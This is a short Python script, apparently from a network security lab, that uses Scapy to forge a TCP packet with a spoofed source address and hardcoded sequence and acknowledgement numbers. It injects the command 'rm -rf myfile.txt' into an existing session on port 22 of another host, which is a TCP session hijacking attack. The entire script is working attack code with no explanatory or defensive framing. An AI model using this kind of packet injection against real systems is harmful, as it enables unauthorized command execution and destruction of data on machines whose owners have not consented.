from scapy.all import *

ip = IP(src = "10.0.2.6", dst = "10.0.2.4")
tcp = TCP(sport = 57862, dport = 22, flags = "A", 
	seq = 587877398,
	ack = 2036224135)
cmd = "\r rm -rf myfile.txt\r"
pkt = ip/tcp/cmd
ls(pkt)#to print the data
send(pkt)
